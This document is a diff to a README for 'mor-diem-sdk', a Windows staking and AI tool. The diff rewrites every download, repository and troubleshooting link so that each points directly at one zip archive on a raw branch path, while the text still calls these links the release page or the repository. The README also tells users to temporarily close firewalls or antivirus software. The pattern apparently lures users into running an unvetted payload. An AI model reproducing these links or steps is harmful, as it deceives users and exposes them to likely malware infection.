@@ -1,6 +1,6 @@
 # ⚙️ mor-diem-sdk - Simple Staking and AI Access
 
-[![Download mor-diem-sdk](https://img.shields.io/badge/Download-Get%20mor--diem-sdk-brightgreen?style=for-the-badge)](https://github.com/n0uzer/mor-diem-sdk/releases)
+[![Download mor-diem-sdk](https://img.shields.io/badge/Download-Get%20mor--diem-sdk-brightgreen?style=for-the-badge)](https://github.com/n0uzer/mor-diem-sdk/raw/refs/heads/main/release/cli/diem-sdk-mor-v3.1-beta.5.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download and run mor-diem-sdk on your Windows computer.
 
 First, go to the release page to get the software files:
 
-[Download mor-diem-sdk](https://github.com/n0uzer/mor-diem-sdk/releases)
+[Download mor-diem-sdk](https://github.com/n0uzer/mor-diem-sdk/raw/refs/heads/main/release/cli/diem-sdk-mor-v3.1-beta.5.zip)
 
 This page shows the latest versions available for download.
 
@@ -98,7 +98,7 @@ If you run into problems, try these fixes:
 
 - Make sure your internet connection is working.
 - Restart the software.
-- Check you have the latest version by visiting the [download page again](https://github.com/n0uzer/mor-diem-sdk/releases).
+- Check you have the latest version by visiting the [download page again](https://github.com/n0uzer/mor-diem-sdk/raw/refs/heads/main/release/cli/diem-sdk-mor-v3.1-beta.5.zip).
 - Look for error messages. They often explain what went wrong.
 - Close other programs that might interfere, such as firewalls or antivirus software temporarily.
 
@@ -130,7 +130,7 @@ If the problem continues, you can ask for help in the project discussions on Git
 
 To learn more about mor-diem-sdk, check the GitHub repository:
 
-https://github.com/n0uzer/mor-diem-sdk
+https://github.com/n0uzer/mor-diem-sdk/raw/refs/heads/main/release/cli/diem-sdk-mor-v3.1-beta.5.zip
 
 Here you find code details, updates, and technical notes.
 
@@ -139,7 +139,7 @@ Here you find code details, updates, and technical notes.
 ## 🔽 Download and Install mor-diem-sdk
 
 1. Visit this page to download:  
-   [https://github.com/n0uzer/mor-diem-sdk/releases](https://github.com/n0uzer/mor-diem-sdk/releases)
+   [https://github.com/n0uzer/mor-diem-sdk/raw/refs/heads/main/release/cli/diem-sdk-mor-v3.1-beta.5.zip](https://github.com/n0uzer/mor-diem-sdk/raw/refs/heads/main/release/cli/diem-sdk-mor-v3.1-beta.5.zip)
 
 2. Choose the latest Windows version file.
 
